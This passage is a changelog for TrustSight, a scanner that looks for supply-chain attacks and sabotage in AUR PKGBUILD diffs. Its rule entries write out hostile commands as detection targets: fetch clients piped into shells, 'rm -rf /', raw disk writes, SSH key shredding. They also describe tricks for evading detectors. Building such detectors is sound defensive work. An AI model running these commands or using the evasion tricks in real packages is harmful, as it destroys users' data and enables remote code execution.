<!-- description: Release history for TrustSight: what changed in each version, why it changed, and what a change means for existing databases, baselines and configurations. -->

# Changelog

## [Unreleased]

_No changes yet._

## [0.15.5] - 2026-09-01

### Fixed

- **Regex audit stability.** The superlinear growth check now runs two
  measurements per probe and takes the minimum of each pair, filtering
  out scheduler noise on loaded machines. Threshold raised from 8x to
  10x for additional headroom while still catching quadratic patterns
  (which cost ~16x).

## [0.15.4] - 2026-09-01

### Added

- **`config sync-rules` wizard.** The command now starts an interactive
  wizard that shows what changed (new rules, outdated patterns, drifted
  fields) and offers three options: full update (overrides everything),
  safe update (adds missing + updates superseded patterns only), or skip.
  The `--full` flag runs full update non-interactively; `--update` runs
  safe update.

- **Review y/n prompt for rules sync.** When the installed `rules.toml`
  differs from the shipped rule set, `trustsight review` now prompts
  `Sync rules now? [y/N]` before scanning. In non-interactive mode
  (piped output, CI), the prompt is skipped and the warning is shown.

## [0.15.3] - 2026-09-01

### Changed

- **`--deps` shows all reverse dependencies.** Each dependency now lists
  every installed package that requires it, not just the roots that
  triggered the walk. For example, `lib32-sdl2` shows `wine32,
  lib32-gstreamer, lib32-mpg123` instead of only `wine32`.

### Fixed

- **Rich output no longer interleaves log messages.** Python's logging
  handler printed directly to stderr, bypassing Rich's live display and
  producing garbled progress bars. A `_suppress_logging()` context
  manager now silences logging during Rich live displays.

- **Rules.toml drift prompt.** When the installed `rules.toml` differs
  from the shipped rule set, a one-time yellow header now says
  `Run 'trustsight config sync-rules' to update` instead of repeating
  the same "Not vetted" message on every package.

- **Spinner stopped before download progress.** The "Discovering
  packages..." spinner now stops before the download progress bar
  starts, preventing two concurrent Rich live displays from fighting
  over the terminal.

- **Regex backtracking warnings demoted to DEBUG.** These messages
  appeared inline with progress bars on every analysis run. Now only
  visible with `--verbose` or debug logging.

- **release/ added to .gitignore.** The publishing workflow creates a
  `release/` scratch directory that caused `build_release_tarball.py`
  to refuse building from a dirty tree.

## [0.15.2] - 2026-09-01

### Fixed

- **Regex audit flakiness under build load.** The `is_superlinear()` check
  in `regex_safety.py` compared wall-clock timing at 512 and 2048 chars;
  CPU load during `makepkg` caused the ratio to exceed the 8x threshold
  for patterns that are actually fine. Raised the threshold from 8x to 12x;
  a ratio above 12x on 4x input is still clearly superlinear (true
  quadratic would be 16x).

- **`check()` FileExistsError on repeat builds.** The PKGBUILD `check()`
  function created a venv with `--system-site-packages` but only cleaned
  `trustsight*` paths. On repeat runs, `zensical_extensions/` from a
  previous install collided with the new wheel. Now removes the entire
  venv before recreating, and also cleans `zensical_extensions`.

## [0.15.1] - 2026-09-01

### Changed

- **AUR RPC queries retry on transient errors.** `get_aur_package_info()` in
  `discovery.py` now retries up to three times with exponential backoff on HTTP
  429, 5xx, and connection-reset errors, and honours `Retry-After` headers.
  Previously a single transient failure discarded all uncached packages with no
  retry.

### Added

- **`review --refresh` forces a fresh metadata snapshot.** The flag bypasses the
  `[discovery] metadata_ttl_minutes` TTL and re-downloads the AUR metadata
  dump immediately. Useful when the snapshot is stale but its age is still
  within the TTL window.

- **Snapshot age shown when reused.** When the AUR metadata snapshot is reused
  without refreshing (TTL not exceeded, or TTL set to 0), the tool now prints
  its age and a hint about `--refresh` or the config key.

### Fixed

- **PKGBUILD source URL uses release asset.** The AUR PKGBUILD source line
  was inadvertently switched to GitHub's generated archive
  (`/archive/refs/tags/`), whose gzip settings changed in 2023 and
  invalidated recorded checksums across distributions. Reverted to the
  immutable release asset (`/releases/download/`).

- **Corpus lock aligned to on-disk count.** `corpus.lock` recorded 3,739
  entries but only 3,246 `.diff` files exist in the benign corpus.
  Updated `total_entries` and all 50+ doc references to 3,246.

- **Regex warning includes rule ID.** The "refusing regex pattern with
  excessive backtracking risk" log message now identifies the rule
  (`(rule R013)`) so operators can diagnose which pattern was refused.

- **CLI flag documented.** `--refresh` added to the CLI reference table.

### Stats

- 2 commits since v0.15.0
- 24 files changed, +137 / -65
- 3,644 tests, all passing
- Package version 0.15.1

## [0.15.0] - 2026-08-31

### Changed

- **Deferred imports for faster startup.** `rich`, `typer`, the analysis engine,
  `discovery`, `ioc_baseline` and `review` are imported on first call rather
  than at module scope, so `--version` and `--help` no longer load the rule
  engine. `HAS_RICH` is now answered via `importlib.util.find_spec` instead of
  a try/except import block. Applied across `display.py`, `review.py`,
  `inspect.py`, `forget.py`, `ioc.py`, and `seed.py`.

- **`review --sort` sorts results after analysis.** Accepts `score` (worst
  first), `risk` (Critical, High, Medium, Inconclusive, Low), or `name`
  (alphabetical). Default is discovery order.

- **`list --sort` sorts packages.** Accepts `score`, `risk`, `name`, or
  `last-checked`. The `--json` output now also carries a `verdict` field
  (the stored risk band).

- **Auto-sync shipped rules on startup.** `ensure_default_configs()` now calls
  `sync_rules()`, appending any shipped rules the user's `rules.toml` is
  missing. This prevents silent rule drift after upgrades; replacements still
  require an explicit `config sync-rules`.

- **Analysis hot-path functions are cached.** `_heredoc_body_indices` (called by
  20 rule families), `_declared_source_basenames` (8 families),
  `join_line_continuations` (10 call sites), and `_enclosing_function_map` are
  now LRU-cached on their input. `_SCALAR_SOURCE_RE` is hoisted to module
  level (was recompiled per call in 8 families).

### Added

- **`inspect --allow-uninstalled`** analyse a package not in the local pacman
  set. The name is resolved against the AUR, cloned, and analysed. Without
  `--record`, the analysis uses a read-only SQLite connection (A15), so auditing
  a suspicious package cannot warm local state. With `--record`, observations
  are written. Installed packages always record; `--record` without
  `--allow-uninstalled` is refused.

- **`inspect --last N`** analyse the N most recent content-bearing commits as
  N separate results, newest first. Each diff is independently scored. Bounded:
  `N <= 50`, combined diff bytes capped at `MAX_RUN_DIFF_BYTES`. Refuses
  `--last` with `--depth > 0` in this version. When the walk is truncated,
  `history_truncated` is attached as a coverage gap to the newest result.

- **`history --from-date / --to-date`** filter history entries by date range.
  Accepts `YYYY-MM-DD` or full ISO datetime. Inclusive: `--to-date 2026-06-01`
  includes entries from that day.

- **`forget --dry-run`** preview what would be removed without touching the
  database. Shows rule counts for each package.

- **Security gate A11 (freshness uses local marker).** `_is_current` in
  `fetcher.py` must read the local `last_fetch_time` marker before consulting
  the HEAD commit time. A gate asserts the pattern via AST analysis.

- **Security gate A15 (audit does not warm state).** `--allow-uninstalled`
  without `--record` opens a read-only SQLite connection (`mode=ro`). A gate
  asserts the connection mode. A package with no local observations has
  maturity 0, so a Medium-band score with no HIGH-or-worse finding renders
  **Inconclusive**, not Low.

- **Six new security gates** for the history walk: bounded walk, bounded run
  diff assembly, truncated walk declared as gap, every diff scored
  independently, and two structural checks.

- **Two new coverage gaps.** `history_truncated` (walk stopped before yielding
  N results) and `scan_truncated` (diff tail not matched by any rule).

### Fixed

- **Corpus size aligned across documentation.** All non-changelog doc references
  updated from 3,246 to 3,739 to match `corpus.lock` and the on-disk count.

- **`test_sort_option_accepted` network dependency.** The review sort test now
  mocks `fetch_metadata` to avoid AUR network calls.

### Security

- **Pipeline hardened against crafted input.** Resource and parser boundaries
  tightened; A4b (differ/companion bounds) and A4c (API input bounds) separated
  as explicit security claims. A15 added to the security model.

### Stats

- 6 commits since v0.14.1
- 51 files changed, +2,244 / -235
- 3,664 tests, all passing
- 71/71 security gates, 10/10 calibration gates
- Package version 0.15.0

## [0.14.1] - 2026-08-30

### Fixed

- **`makepkg -si` fails on upgrades from systems with trustsight already
  installed.** The AUR `check()` function creates a test venv with
  `--system-site-packages`, which inherits the system-installed trustsight
  package. The installer then collides on the existing package files and
  entry-point script, leaving the old version in place. The venv now has the
  inherited package removed before the fresh wheel is installed.

- **H043 regression tests fail when a stale `rules.toml` exists.**
  `test_an_evasion_only_chain_can_reach_the_stage_count` and
  `test_the_staged_attack_annotation_reaches_the_reader` call `scan_diff()`
  with the default config, so they read the operator's
  `~/.config/trustsight/rules.toml`. A stale file shipped before v0.13.2
  carries a legacy R054 pattern that no longer matches, so the persistence
  kill-chain stage never fires, the diff only reaches two of the three
  required stages, and H043 stays below threshold. Both tests now take the
  `isolated` fixture, which redirects `CONFIG_DIR` to a scratch directory so
  the shipped defaults are always used.

## [0.14.0] - 2026-08-25

### Changed

- **Rule ids now say how a rule works: `R` is a regex, `H` is a heuristic.**
  The `R` prefix used to mean only "a detection rule". Some `R` ids were
  patterns in `rules.toml` that an operator could read, tune or disable; others
  were emitted from analysis code and could not be touched from a config file at
  all. Nothing in the id distinguished them, so "look up the rule and adjust it"
  was advice that worked for some ids and silently failed for others.

  The ninety-five programmatic ids are renamed to `H001`-`H095`. The
  thirty-two ids declared in `rules.toml` keep their `R` prefix, and after this
  release every `R` id is something you can find and edit in that file. No
  exceptions, which is the point: the prefix is now a fact about the rule rather
  than a fact about when it was added.

  The `S`, `X`, `C`, `D`, `W` and `P` families are untouched.

    - **The mapping is derived, not hand-written.** It is the catalog minus the
      shipped rule set, computed once by `scripts/rule_id_mapping.py` and frozen
      into `trustsight.rule_id_history`. A hand-maintained list would be a second
      list that has to agree with the catalog, which is the defect class this
      release is cleaning up rather than repeating.
    - **Stored ids are migrated on first open.** Alert de-duplication keys on
      `(package_name, rule_id)`, so without a migration the first run after
      upgrading would treat every previously-seen alert as new and re-notify for
      the whole watchlist. `alert_state` and `triggered_rules` are rewritten, and
      the database is stamped with a schema version so the rewrite runs once.
    - **Baselines and reports published before this release name the old ids.**
      `trustsight.rule_id_history.current_id` translates one, for artifacts that
      are read but never rewritten.
    - **Retired ids are not recycled.** The rename frees ninety-five `R`
      numbers, and a stored report, a published baseline or a `[rules.R###]`
      override can still name one. Handing `R060` to an unrelated new rule
      would make those references quietly wrong rather than loudly absent, so
      the linter reserves every retired id and refuses a `rules.toml` entry
      that claims one.
    - **Weights, severities, thresholds and behaviour are unchanged.** No rule
      fires differently; only its name changed.

### Fixed

- **The test suite no longer hangs.** A full run stalled indefinitely instead
  of finishing. `test_watch_stops_cleanly_on_interrupt` patches
  `run_baseline_build`; under a full run the patch stopped applying, the real
  function ran, and the suite sat downloading the live AUR metadata dump
  behind a 300-second timeout. It never failed - it waited, with no failing
  assertion to point at.

  The suite now runs offline by construction: `TRUSTSIGHT_OFFLINE` is set for
  every test and outbound sockets are blocked, so a missing mock raises
  immediately and names the frame that reached for the network. A full run
  finishes in about 85 seconds.

    - **The cause of most of it was one test.** A lint test deleted every
      `trustsight*` entry from `sys.modules` to check an attribute is built
      lazily, and never restored them. After that, a later test's
      `monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)` patched a
      different module object from the one its own imports were bound to:
      `init_db()` created tables in a temporary directory while
      `get_connection()` opened the operator's real database. That single
      leak accounted for twenty-seven failures across three files, none of
      which named the test that caused them - including a `H064` cold-start
      failure that looked like a rule bug and was not one.
    - **The guard is a `BaseException`.** `run_watch` treats a failed cycle as
      a network blip and retries forever when the cycle count is zero, so a
      guard that ordinary error handling can swallow turns a stall into a
      spin.

#### Rule id mapping

| Old | New | Old | New | Old | New | Old | New |
|---|---|---|---|---|---|---|---|
| `R004` | `H001` | `R070` | `H025` | `R096` | `H049` | `R125` | `H073` |
| `R005` | `H002` | `R071` | `H026` | `R097` | `H050` | `R126` | `H074` |
| `R006` | `H003` | `R072` | `H027` | `R098` | `H051` | `R127` | `H075` |
| `R009` | `H004` | `R073` | `H028` | `R100` | `H052` | `R128` | `H076` |
| `R014` | `H005` | `R074` | `H029` | `R101` | `H053` | `R129` | `H077` |
| `R016` | `H006` | `R075` | `H030` | `R102` | `H054` | `R130` | `H078` |
| `R018` | `H007` | `R076` | `H031` | `R105` | `H055` | `R131` | `H079` |
| `R019` | `H008` | `R077` | `H032` | `R106` | `H056` | `R132` | `H080` |
| `R020` | `H009` | `R079` | `H033` | `R107` | `H057` | `R136` | `H081` |
| `R021` | `H010` | `R080` | `H034` | `R108` | `H058` | `R137` | `H082` |
| `R022` | `H011` | `R081` | `H035` | `R110` | `H059` | `R138` | `H083` |
| `R023` | `H012` | `R082` | `H036` | `R111` | `H060` | `R139` | `H084` |
| `R024` | `H013` | `R083` | `H037` | `R112` | `H061` | `R140` | `H085` |
| `R025` | `H014` | `R084` | `H038` | `R114` | `H062` | `R141` | `H086` |
| `R060` | `H015` | `R085` | `H039` | `R115` | `H063` | `R142` | `H087` |
| `R061` | `H016` | `R086` | `H040` | `R116` | `H064` | `R143` | `H088` |
| `R062` | `H017` | `R087` | `H041` | `R117` | `H065` | `R145` | `H089` |
| `R063` | `H018` | `R088` | `H042` | `R118` | `H066` | `R146` | `H090` |
| `R064` | `H019` | `R089` | `H043` | `R119` | `H067` | `R147` | `H091` |
| `R065` | `H020` | `R090` | `H044` | `R120` | `H068` | `R148` | `H092` |
| `R066` | `H021` | `R092` | `H045` | `R121` | `H069` | `R149` | `H093` |
| `R067` | `H022` | `R093` | `H046` | `R122` | `H070` | `R150` | `H094` |
| `R068` | `H023` | `R094` | `H047` | `R123` | `H071` | `R151` | `H095` |
| `R069` | `H024` | `R095` | `H048` | `R124` | `H072` |  |  |

## [0.13.2] - 2026-08-15

### Added

- **A crossfire rule family (X001-X007): the evasion technique, not the
  payload.** Every other family fires on what a diff does; these fire on how it
  was written. The reason is where detection actually failed - the payload rules
  held, and the tokenizer feeding them did not. Partial quoting (`c"u"rl`),
  array routing (`${A[0]}`), namerefs and command substitution each assemble an
  executable name that no pattern over the resolved text ever sees, because
  resolution is the step that broke.

  The failure mode inverts: a defeated tokenizer used to produce silence, which
  is the worst available output - the analysis reads clean exactly when it
  understood least. It now produces a CRITICAL finding, so the bypass and the
  alarm are the same event.

    - `X001` encoded payload decoded to a shell (CRITICAL), `X002` non-literal
      executable name (CRITICAL), `X003` obfuscated command argument (HIGH),
      `X004` build output suppressed (MEDIUM), `X005` write into the operator's
      home (HIGH), `X006` source points somewhere unexpected (HIGH), `X007` two
      or more techniques in one diff (CRITICAL).
    - **Measured before weighted.** Against the 3,739-diff locked benign
      corpus: X001, X003, X004, X005, X006 and X007 fire on **zero** diffs;
      X002 on 26 (0.695%). The ceiling is 30%, so these sit well under it,
      which is what makes CRITICAL affordable - legitimate recipes do not
      assemble command names out of parts. Hardening X002 against evasion
      raised its rate from 0.374%, and two further exclusions (an expression
      context is not a command; a leading flag means a continuation line)
      brought it back down from 1.097%.
    - **The anti-evasion rules were themselves attacked, and lost twelve
      times before they held.** A family whose purpose is detecting evasion is
      the one place where "can the rule be evaded" is not rhetorical. X002 fell
      to nine variants that displace the command word - an assignment prefix
      (`FOO=1 ${A[0]}`), a wrapper (`env`, `exec`, `sudo`, `nohup`,
      `timeout 5`), a leading redirect (`>out ${A[0]}`) and a subshell
      (`( ${A[0]} )`) - because it read the first token rather than walking
      past prefixes. X001 fell to `| /bin/sh` and `| env sh`; X005 to
      `/home//alice` and an assignment prefix. All are closed and pinned as
      regressions in `tests/test_crossfire.py` (47 tests), alongside a bounded
      matching check: no pattern may be made to backtrack on an 8 KiB hostile
      line, which is the failure a sabotage rule already produced once.
    - **X002's exclusions were derived from the corpus, not guessed.** An
      assignment names no executable (`font=$(grep ...)`); a variable the
      tokenizer reduced to a literal is a spelling choice, not an evasion; and
      quotes and parentheses bound the command split, because a `|` inside
      `sed 's|a|b|'` and an `&&` inside `(( a && b ))` are not command
      separators. Each of those produced false positives before it was handled.
    - **Two candidates were dropped for overlap rather than difficulty.**
      Base64-to-shell is R003/R043 at CRITICAL; bidi and homoglyphs are R013 at
      FATAL plus R013b. X001 ships as the *remainder* of the first. There is no
      X008: the bidi rule leaves nothing for it to do, and scoring the same
      characters twice would corrupt the calibration.
    - **X005 became a rule about the spelling, not the write.** R077 already
      claims a target starting with `~/` or `$HOME/`, so a second rule beside
      it scored one line twice. But R077 matches only that prefix, and the same
      directory is reachable as `/home/alice/...`, `/home/$USER/...`,
      `~alice/...`, `/root/...`, `${HOME:-/home/alice}/...`, or by traversing
      into it - none of which it sees. X005 now owns exactly those, defers to
      R077 on the plain spelling, and exempts `$pkgdir` staging. It fires on
      zero benign diffs.
    - **R077 is CRITICAL inside an install scriptlet.** pacman runs scriptlets
      as root during the transaction, so a write into a user's home from one is
      categorical rather than suspicious. The same write during `build()` stays
      HIGH.
    - **Two more were dropped on measurement.** Bare `2>/dev/null` fires on
      0.481% of benign diffs as ordinary defensive shell, so X004 excludes it.
      Domain reputation and upstream-owner matching are absent from X006
      because the novelty tier already scores a globally-first-seen URL.

- The `crossfire` category, previously reserved for cross-package comparison
  and shipping nothing, now carries this family. `R143` moved to
  `maintainer-and-metadata`, where `R141` already lives: it had been filed under
  `crossfire` by mistake, which left the generated index simultaneously listing
  it and stating that crossfire ships nothing. `COMPOSITION` was not an option
  either - its rules are weight-0 annotations and R143 scores 25.

- **A sabotage rule family (S001-S008).** Every other family describes a
  supply-chain compromise - code fetched, credentials sent, persistence
  installed - and all of them assume the attacker wants something *out* of the
  machine, so there is a fetch or an egress to notice. A sabotage payload
  wants nothing out: it runs, and the machine is worse off.

  Measured before these rules existed, all of the following scored **0/100**
  in `build()`: a classic fork bomb, `rm -rf / --no-preserve-root`,
  `dd if=/dev/zero of=/dev/sda`, `mkfs.ext4 /dev/sda1`,
  `shred -u ~/.ssh/id_rsa`, `chmod -R 777 /`, an `xmrig` invocation, and
  `history -c`. A `curl | bash` on the same line scored 65, which is the shape
  of the gap: excellent at supply-chain compromise, blind to sabotage. It was
  not a documented limit either.

    - `S001` recursive self-spawn (CRITICAL), `S002` recursive deletion
      outside the build tree (CRITICAL), `S003` raw block device write
      (CRITICAL), `S004` secure deletion of user data (HIGH), `S005`
      permission change on a system path (HIGH), `S006` system service
      disruption (HIGH), `S007` cryptocurrency miner (HIGH), `S008` shell
      history or log destruction (MEDIUM).
    - Named **sabotage**, not destruction: exhausting the CPU, stopping the
      services a machine exists to run, and mining someone else's coin all
      destroy nothing, and a family called destructive would have had no home
      for them.
    - Three distinctions carry the calibration, because none of these commands
      is rare in a PKGBUILD. The build sandbox is not the system (`rm -rf
      "$srcdir/build"` is housekeeping). A mention is not an invocation
      (`echo "never run rm -rf /"` is a recipe being helpful, so every command
      name is anchored to command position). A package's own service is not the
      system's (`systemctl disable input-remapper` on removal is standard
      packaging, so only system units count).
    - Every rule fires on **zero** of the 3,739 diffs in the locked benign
      corpus.

- **AUR dependency depth.** An AUR package's `depends` and `makedepends` can
  name other AUR packages, and `makepkg` builds those on your machine in the
  same run - so a review that read only the package you typed was reading one
  recipe out of several that would execute. This is the June 2026 campaign's
  relevance: an orphan is far more often somebody's dependency than the thing
  they meant to install.

  `[depth] levels` in config and `--depth` per run: `0` disables it, `1` (the
  default, for both `review` and `inspect`) analyses direct AUR dependencies,
  `n` analyses `n` levels, `-1` walks every level there is.

    - **Each dependency is analysed as a package**, not as a component of
      one: its own score, its own band, its own coverage gaps, its own row in
      the database. Nothing is folded into the parent's score. That is
      load-bearing rather than fastidious - `depth` is deliberately absent
      from the config fingerprint, so a parent score that moved with
      `--depth` would break B1 for every operator comparing two runs.
    - **`-1` is bounded, and has to be.** The dependency graph is written by
      the party under review: a recipe declaring five hundred AUR
      `makedepends`, each declaring five hundred more, would otherwise decide
      how many repositories this machine clones - the A14 breach that Part D
      lists as a vulnerability. The ceilings are `depth.MAX_DEPTH_LEVELS` (8)
      and `depth.MAX_DEPTH_NODES` (200 per run), both source constants.
    - **New `deps_not_scanned` coverage gap**, recorded when the walk stopped
      early: a ceiling cut it short, or a dependency could not be analysed. A
      walk that *completed* is not a gap - asking for depth 1 and getting
      depth 1 answers the question that was asked, and calling that
      incomplete would make every default run report a gap and teach readers
      to ignore it.
    - The walk is cycle-safe, and one dependency is analysed once per run
      even when twenty installed packages share it.
    - **On the corpus path** (`full-aur`) the walk reads results the cycle has
      already computed - the stored package profile first, the stored PKGBUILD
      snapshot as a fallback - instead of re-running the pipeline for a package
      that is analysed as a root anyway. Its visited set is deliberately *not*
      shared between corpus packages: every package is a root there, so a
      shared set would hand each dependency to whichever parent ran first and
      leave every other parent reporting an empty closure, which reads as "this
      package has no AUR dependencies".
    - Dependency metadata comes from the corpus snapshot when one exists (no
      network at all), otherwise one batched AUR RPC request per level.
      `optdepends` is out of scope - it is not installed by default.
    - **Mini-cards.** Each dependency renders as its own card nested inside
      the package's card, indented by level, on all four terminal surfaces,
      and as a `dependencies` array on all three JSON surfaces. The
      `every render reports the same information` gate was extended to cover
      them, so a dependency shown in one surface cannot be missing from
      another.

- **Detection for the June 2026 AUR campaign ("Atomic Arch",
  Sonatype-2026-003775).** The campaign hijacked ~1,500 orphaned packages,
  left the upstream source untouched, and added npm build dependencies whose
  install step ran a credential-harvesting binary during `makepkg`.

  Measured before this change, on a database with a normal corpus, that diff
  scored **15/100 - UNFLAGGED**. The 65 an empty database produced was an
  artifact: 50 of those points were D001 "this dependency has never been seen
  in the AUR", which goes silent once the corpus knows `npm` and `nodejs`. The
  better the corpus, the lower the attack scored. It now scores **70/100,
  High**.

  Four pieces, and only the first is a security invariant:

    - **`unpinned_build_deps` coverage gap (B2, A14).** `makepkg` verifies
      `source=()` against `sha256sums` and verifies nothing a build step
      resolves from a registry, so when `prepare()` runs `npm install foo` the
      code that will execute is not in the analysed text. That is a missing
      sensor, so it is reported as one: the gap forbids UNFLAGGED and
      qualifies the band. Deliberately **not** a scored rule - `npm install`
      in a build function is ordinary AUR practice, which is exactly why R081
      is scoped to install hooks and a calibration gate keeps it there, and
      why the attack looked normal. Fires on 0.3% of the locked benign corpus.
    - **R141 (adopted from orphan, MEDIUM).** The campaign's entry point.
      R092/R093/R107/R111/R126 all describe adoption and all need a
      `full-aur` cycle, so `trustsight review` users - the people actually
      hit - had no adoption signal at all. R141 uses the AUR `Maintainer`
      field the review path already fetches and threw away. Orphan state is
      persisted tri-state (orphaned / maintained / never asked), and an
      unavailable RPC records unknown rather than guessing either way.
    - **R142 (recipe changed without upstream, MEDIUM).** A dependency array
      **and** a build function both moved while `source=`, every `*sums=` and
      `pkgver` did not. The conjunction is measured, not assumed: on the
      3,739-diff benign corpus `deps or build` fires on 11.53% and
      `deps and build` on **1.42%** - eight times less noise for no lost
      detection, since the campaign changed both. It also keeps R142 off
      R060's territory, which is INFO precisely because "build function
      modified" fires on 21.4% of benign diffs.
    - **R143 (the composition, HIGH).** R141, R142 and a registry resolution
      together. Each member is ordinary alone and cheap by design; scoring
      the conjunction is what clears the flag threshold without any single
      rule spending fire rate it does not have.

- **An IOC surface for names a build step installs.** A `package` indicator
  reached the AUR package name, `pkgbase` and the dependency arrays. The
  campaign named its payload in none of those - `atomic-lockfile` appeared
  only as an argument to `npm install` inside `prepare()` - so a curator's
  list naming it would have matched nothing. Matches now carry the
  `build_install` surface.

- **`data/iocs/atomic-arch-2026-06.json`**, three `package` indicators
  (`atomic-lockfile`, `lockfile-js`, `js-digest`) with `Sonatype-2026-003775`
  provenance, built to an unsigned baseline in `ioc-baselines/`. Narrowest
  indicator per the curation policy: the `deps` binary name is deliberately
  **excluded** as far too generic without a hash, and no domains or hashes
  were invented.

### Security

- **Four vocabularies were allowlists, and each was one rename wide.** An
  external audit ran twenty-three passes against this tree; the findings
  collapsed into a small number of root causes, and the fixes below are those
  causes rather than the individual spellings.

  *The executor list.* `curl url | php` is a remote shell as surely as
  `curl url | bash`, and php, lua, tclsh, fish, tcsh, csh, rc, es, elvish,
  xonsh and nu all execute standard input given no script argument. All now
  score 65/High where they scored 30. `awk` is deliberately absent: awk reads
  its program from an argument and its stdin is data.

  *The execution-verb forms.* A flag or a wrapper is not a different
  operation, but `bash -x s.sh`, `env bash s.sh`, `nohup`, `timeout 5`,
  `busybox sh`, `node s.sh`, `/usr/bin/bash s.sh` and a bare `"$srcdir/s.sh"`
  each produced no execution at all, so the write on the previous line paired
  with nothing. `env -i bash` was caught while plain `env bash` was not, which
  is the asymmetry that gives it away: the pattern was reading the verb's
  position rather than what runs.

  *The write forms.* `tee` names its destination as an argument - that is its
  purpose - and only the redirect spelling was read. `make > s.sh`,
  `gzip -dc p.gz > s.sh`, `perl -e 'open(F,">s.sh")'` and
  `python3 -c "open('s.sh','w')..."` were all invisible, and `dd of=X if=Y`
  failed for a third reason: the destination was read as the last token on
  the line.

  *The fetch-client list.* See X009 below.

- **Five new crossfire rules, for the shapes a longer list cannot express.**
  X001-X008 match *techniques*; these match the point where an inventory ran
  out.

    - **X009 (CRITICAL)** - a fetch reaching a shell through a client other
      than curl/wget. `lftp -c "cat URL" | bash`, `nc host 80 | bash`,
      `scp host:/x - | bash`, `openssl s_client -connect h:443 | bash`,
      `dig +short TXT d | sh` and `aria2c -o - URL | bash` produced nothing;
      several scored **zero with no coverage gap**, a silent clean verdict on
      a working remote code execution. The client vocabulary now lives in one
      place and is shared with R061, R137 and R051.
    - **X010 (HIGH)** - an interpreter one-liner that reaches the network.
      `php -r 'system(file_get_contents(URL));'` needs no shell client, so
      R061's inventory never saw it.
    - **X011 (HIGH)** - a package manager fetching and running third-party
      code at build time: `pip install git+https://`, `npm install <url>`,
      `cargo install --git`, `go install m@latest`, and the one-shot runners
      `npx`/`bunx`/`uv run`/`pipx run`. It stands down on the spellings that
      answer its own question - `npm install --ignore-scripts` turns off the
      hooks, `pip install --no-deps .` installs what this recipe just built -
      because both benign-corpus hits carried their disqualifier on the line.
    - **X012 (HIGH)** - `CC`, `PATH`, `LD_PRELOAD` and friends pointed into
      `$srcdir` ahead of a compile step. The override fetches nothing and
      executes nothing a reader can see; what it does is decide which binary
      the *next* line runs.
    - **X013 (HIGH)** - a proxy, DNS override, host remap or replaced CA. A
      URL in `source=()` says where the bytes come from and a reader checks
      the host; `--resolve`, `--connect-to`, `--doh-url`, `--cacert`,
      `SSL_CERT_FILE` and `CURL_CA_BUNDLE` override that answer afterwards.
      R057 owns `-k` - turning verification off; this is the other half.

  All five fire on **zero** of the 3,246 diffs in the locked benign corpus,
  and the flag rate is unchanged at 377 (11.614%).

- **The last of the audit's silent rows.** Replaying the probe corpus after
  these changes leaves 81 of 687 rows silent, of which 72 are the audit's
  own benign controls - `make`, `true`, `_size=999` - which must stay at
  zero. Nine carry a payload, and each is a stated boundary rather than an
  oversight: the 5 MiB byte cap, a secret lookup that exfiltrates rather
  than executes, a `submodule.update` value git itself rejects, and configs
  written into the build tree whose tool never names the file.

  Closed on the way: `ttyd` and `zellij` as exec wrappers, `xargs` as a
  wrapper *inside* a pipeline (its `-I{}` flags carry braces the general
  wrapper pattern does not allow), Perl's `open2`/`open3`, a flag whose
  value is a script in the build tree, and a quoted value that is itself a
  pipeline into a shell (`mutt -e "push \"|bash\""`, whose quotes are
  backslash-escaped because the value nests inside another argument).

- **Docs: navigation and reference tone.** The fifteen rule category pages
  were declared under a `project.nav.rules` table with no `rules` parent, so
  none of them rendered in the navigation - the rule list was reachable only
  by following a link from the index. Rules is now its own top-level
  section with all seventeen pages, and the nav uses the same
  array-of-tables form throughout.

  The crossfire and unverifiable pages were rewritten as reference rather
  than narrative. They had grown to argue *why* each rule was written -
  which version was wrong, what fired on how many benign packages - and
  that is changelog material. A reference page states what a rule matches,
  shows a fires/quiet table, and links to the rules it defers to. The
  provenance stays here, where it belongs.

  The index generator learned the W series and the new entry format; it had
  been silently skipping six rules. It now also writes a **Rules on this
  page** table into each of the fifteen category pages: those pages were a
  flat run of `###` sections with no `##` above them, so a reader looking
  for one rule got a single unstructured table of contents and had to
  scroll.

  A full pass over all 58 pages fixed the rest: two orphan pages
  (`license.md`, `contributing/blinded-evaluation.md`) reachable only by
  URL, seven pages carrying more than one `# ` heading, and the last of the
  provenance narrative on the R147 and R149 entries.

- **The audit's own probe corpus, replayed.** The reports ship the scripts
  that produced them - 199 probes, 2,907 rows, each with the score recorded
  at the time. Replaying all of them against this tree turned a sampled
  claim into a measured one: of 687 rows that scored zero when the audit
  ran, 555 now score or fire a technique rule. What follows is what the
  replay found that sampling had missed.

- **`ssh` was never a fetch client.** It read as covered because the
  audit's probe used `host` as the hostname, which collides with the `host`
  DNS client - the chain fired for the wrong reason, and any other hostname
  scored nothing. Anchored on a remote command, since neither `ssh` nor
  `scp` appears anywhere in the benign corpus.

- **A filter between the fetch and the shell.** X009 wanted the shell
  immediately after the pipe, so `dig +short txt e | head -c 2000 | bash`
  hid the whole chain. R001 and R002 read past intervening stages for curl
  and wget; the rule written to cover the remainder did not. Both arms now
  ask about the *end* of the pipeline.

- **A trailing `|| true` hid the pipe before it.** The pipeline reader
  treated `||` as voiding the line rather than ending the pipeline, and
  `| bash || true` - how nearly every probe spells the shape, so a failing
  payload does not fail the build - discarded the pipe entirely.

- **X022: a generated config handed to the tool that reads it.** The
  largest silent family in the audit. R145 and R149 claim a config that is
  *shipped*; this one stays in the build tree, where naming `$srcdir` is
  perfectly normal, and is never installed anywhere. What makes it
  execution is the second line - `printf "dhcp-script=$PWD/x.sh" >
  "$srcdir"/d` then `dnsmasq --conf-file="$srcdir"/d`. The pairing is the
  observable: writing a config is ordinary and passing a filename to a
  program is ordinary.

- **X023: command output executed as a script.** `pass otp e | bash`,
  `cat /sys/kernel/tracing/trace | bash`. The bytes are produced locally so
  no fetch rule has anything to say. No package in the benign corpus pipes
  anything at all into a shell.

- **Padding with comments pushed the payload past the line cap.** The twin
  of padding a single line with spaces, and it survived that fix: 20,000
  `# c` lines pushed a `curl … | bash` past `MAX_SCANNED_LINES`. Comments
  and blanks are still emitted - dropping them would renumber every line
  after them, and the line number is evidence - but they no longer count
  against the limit.

- **git's exec-bearing config keys.** `core.fsmonitor`, `diff.external`,
  `filter.*.clean`, `credential.helper` and the rest name programs git
  runs, and `git -c key=cmd` sets one without looking like a command. A
  bounded list, because git publishes it - and narrowed to git's own
  semantics: `submodule.<n>.update` takes `checkout|rebase|merge|none|
  !command` and an alias is a git subcommand unless prefixed with `!`, so
  disabling a submodule stays quiet as it does twice in the corpus.

- **X021: the executor is literal and the file it runs is not.** X002 asks
  whether the *command* can be read from the text; this asks the same of
